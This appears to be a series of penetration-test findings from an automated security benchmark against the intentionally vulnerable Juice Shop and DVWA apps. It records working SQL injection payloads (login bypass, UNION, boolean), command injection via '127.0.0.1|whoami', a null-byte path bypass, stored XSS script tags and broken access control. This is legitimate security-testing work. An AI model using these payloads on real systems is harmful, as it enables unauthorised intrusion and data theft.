Directory listing at /ftp/ (HTTP 200, text/html) includes "acquisitions.md 909 12/19/2023". Direct GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with excerpt: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph:". Memo text returned without authentication.

findings.title: Login authentication bypass via SQL injection in email field
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user (admin@juice-sh.op, bid=1) with no valid credentials, showing the email value is injected into the SQL login query. Token redacted in this record.

findings.title: Poison null-byte bypass of /ftp/ backup file restriction exposes package.json.bak
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (unauth) -> 403 'Error: Only .md and .pdf files are allowed!'
findings.response_evidence: Raw path returned HTTP 403: 'Error: Only .md and .pdf files are allowed!'. Null-byte path returned HTTP 200 with restricted backup content: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}'. Both behaviors shown, so the filter bypass is confirmed.

findings.title: Browsable /encryptionkeys/ directory exposes premium.key and jwt.pub
findings.response_evidence: HTTP 200 text/html directory listing: 'listing directory /encryptionkeys/ ... Name Size Modified jwt.pub 248 12/19/2023 ... premium.key 50 12/19/2023'. Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key. Direct retrieval of premium.key without auth returned HTTP 200 with key material (50 bytes, 32-hex-character secret). The directory is browsable and exposes sensitive key files.

findings.title: Unauthenticated /api/Feedbacks returns feedback records with only masked author emails
findings.response_evidence: HTTP 200 without authentication, returning 8 records with fields UserId, id, comment, rating, createdAt, updatedAt. No email field exists. Emails appear only inside comment text and are masked: 'I love this shop! ... (***in@juice-sh.op)', 'Great shop! ... (***@juice-sh.op)', 'Nothing useful available here! (***der@juice-sh.op)', '(***ereum@juice-sh.op)'. Other records show '(anonymous)' or UserId null. Unauthenticated access is confirmed, but full author email addresses are not disclosed, so the PII criterion is not met. Partial masking leaks only fragments and the domain. Recommend Coordinator decide whether partial-masked PII counts as CWE-359 or should be downgraded to an information-exposure note.

findings.title: SQL Injection via session-input.php id parameter (DVWA) [security=high]
request_sequence: POST /security.php (security=high, seclev_submit=Submit, user_token) -> 302; GET /security.php shows 'Security level is currently: high'
findings.response_evidence: [security=high] Security level confirmed high on GET /security.php ('Security level is currently: high'). TRUE payload stored in session, then /vulnerabilities/sqli/ returned 5 records: ID: 1' OR '1'='1' # First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload 1' AND '1'='2' # then /vulnerabilities/sqli/ returned NO record rows (only the 'Click here to change your ID' form and page chrome). Behavioral TRUE/FALSE differential confirmed through the out-of-band session-input path with trailing comment.

findings.title: SQL Injection in product search q parameter (Juice Shop, unauthenticated)
request_sequence: GET /rest/products/search?q=apple (benign baseline, from mapping: HTTP 200, 2 products, no error)
findings.response_evidence: Quote payload q=qwert' returned HTTP 500 with body: 'Error: SQLITE_ERROR: near "'%'": syntax error' (Express stack banner). UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 application/json: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}] } - the attacker-chosen UNION column values (2..9) are reflected in product fields, proving injection into the SQL query. Benign baseline q=apple (mapping) returned HTTP 200 with 2 legitimate products (Apple Juice id 1, Apple Pomace id 24) and no SQL error. Confirmed via error-based and UNION-based injection.

findings.title: [security=medium] SQL Injection (numeric boolean) in id field of /vulnerabilities/sqli/
findings.response_evidence: [security=medium] Page header confirmed 'Security level set to medium' and 'Security Level: medium'. TRUE payload id='1 OR 1=1' returned 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id='1 AND 1=2' returned zero records (only 'User ID: 1 2 3 4 5' dropdown text, no 'ID:/First name:/Surname:' rows). Surnames leaked: Brown, Me, Picasso, Smith, admin.

findings.title: [security=medium] OS Command Injection via pipe bypass in ip field of /vulnerabilities/exec/
findings.response_evidence: [security=medium] Page header 'Security Level: medium' (security level set via POST and confirmed on subsequent GET). Response to ip='127.0.0.1| whoami' contains ping output followed by the injected command result 'www-data' under 'Ping a device'. Web-process identity www-data confirmed.

findings.title: [security=high] OS Command Injection via ip parameter (pipe without trailing space)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> user_token=[REDACTED], level shown as medium before change
POST http://dvwa/security.php form: security=high, seclev_submit=Submit, user_token=[REDACTED] -> 302 to /security.php
GET http://dvwa/security.php -> page text: 'Security level is currently: high' and 'Security level set to high'
findings.response_evidence: [security=high] Response from POST /vulnerabilities/exec/ with ip=127.0.0.1|whoami contains 'Ping a device ... Enter an IP address: www-data More Information ...' and page footer 'Security Level: high'. The 'www-data' string appears in the command output directly after the ping form, proving the pipe metacharacter executed 'whoami' under the web-process identity. Level confirmed high via GET /security.php: 'Security level is currently: high'. Note: the harness session_info field reported security_level 'low' throughout, but the DVWA page itself rendered 'high' for both the security page and the exec page; the page rendering was treated as authoritative.

findings.title: Cross-user basket access (BOLA) - juiceshop_acct2 reads basket 1 owned by UserId 1
request_sequence: GET http://juiceshop:3000/rest/user/whoami (session juiceshop_acct1) -> session_info.own_basket_id=6, email acct1_bench@juiceshop.local
GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1) -> 200, UserId 22, only Apple Juice (1000ml) qty 3
findings.response_evidence: Account acct2 (acct2_bench@juiceshop.local, own_basket_id=7) received HTTP 200 for GET /rest/basket/1: {"status":"success","data":{"id":1,"UserId":1,...,"Products":[{"name":"Apple Juice (1000ml)","BasketItem":{"BasketId":1,"quantity":2}},{"name":"Orange Juice (1000ml)","BasketItem":{"BasketId":1,"quantity":3}},{"name":"Eggfruit Juice (500ml)","BasketItem":{"BasketId":1,"quantity":1}}]}}. Basket 1 is owned by UserId 1, not acct2 (basket 7). acct1's own basket is 6 (UserId 22) containing only Apple Juice qty 3, so Orange Juice qty 3 and Eggfruit Juice qty 1 in basket 1 are distinct seeded items that acct2 should not be able to see. Ownership is not enforced on basket ID.

findings.title: Unauthenticated User-Feedback PII Exposure (partially masked author emails) on GET /api/Feedbacks
findings.response_evidence: HTTP 200 without any authentication, JSON {"status":"success","data":[...8 records...]}. Records expose UserId, id, comment, rating, timestamps. Records authored by registered users carry an author email in the comment, but it is masked by the application: "(***in@juice-sh.op)" (UserId 1), "(***@juice-sh.op)" (UserId 2), "(***der@juice-sh.op)" (UserId 3), "(***ereum@juice-sh.op)" (UserId 21). Remaining 4 records have UserId null and "(anonymous)". No full email address appears in the response. Unauthenticated access to the endpoint is CONFIRMED, and it discloses author-linked UserIds and partial email fragments plus domain, but full author email addresses are NOT disclosed, so the stated confirmation criterion (disclosure of author email addresses) is not fully met. Verdict left inconclusive for Coordinator decision (partial-PII severity vs. full-disclosure requirement). Not verified: whether a full email is retrievable via other unauthenticated endpoints (out of this assignment).

findings.title: Unauthenticated Feedbacks listing: author emails only masked, no full PII disclosed (re-verification)
findings.response_evidence: HTTP 200 without authentication, 8 records. Every record's author field is either masked or anonymous. Record 1: UserId 1, comment '... Highly recommended! (***in@juice-sh.op)'. Record 2: UserId 2, '(***@juice-sh.op)'. Record 3: UserId 3, '(***der@juice-sh.op)'. Record 4: UserId 21, '(***ereum@juice-sh.op)'. Records 5-8: UserId null, '(anonymous)'. No unmasked email address appears in any record, and the UserId values are numeric identifiers only. The partial masking reveals only a fragment of the local part plus the public domain juice-sh.op, which does not meet the bar of full author email PII disclosure. Rejected for CWE-359 as currently evidenced. Note: the masked fragments still leak partial local-part characters, so this is a low-severity information leak at most.

findings.title: Open directory listing of /ftp/ exposes internal documents including acquisitions.md
findings.response_evidence: HTTP 200 text/html, unauthenticated. Page title 'listing directory /ftp/' with a directory index listing. Links and entries include: quarantine, acquisitions.md (909 bytes), announcement_encrypted.md (369237), coupons_2013.md.bak (131), eastere.gg (324), encrypt.pyc (573), incident-support.kdbx (3246), legal.md (3047), package.json.bak (4291), suspicious_errors.yml (723). Listing confirms the files are enumerable without authentication. Direct retrieval of acquisitions.md was already confirmed in a prior run and is not repeated here.

findings.title: Stored XSS in guestbook message persists and executes on render [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin, low) with txtName=test, mtxMessage=<script id="test_token">window.xss_flag=1</script>, btnSign=Sign Guestbook (prior run)
findings.response_evidence: [security=low] Re-verification in the authenticated dvwa_admin session. The rendered page reports 'Security Level: low'. The browser DOM contains <script id="test_token">window.xss_flag=1</script>, which was stored and rendered back unescaped from the guestbook. Note: the page footer read 'Security Level: high' in one plain HTTP fetch, but it read 'low' in the browser render and in session_info, so that HTTP text was inconsistent and the target is treated as low. Guestbook table shows the stored entries; the canary entry rendered only as an injected script element, so its visible message text is not shown in the rendered table. This is a new persistence check that does not change the prior result.
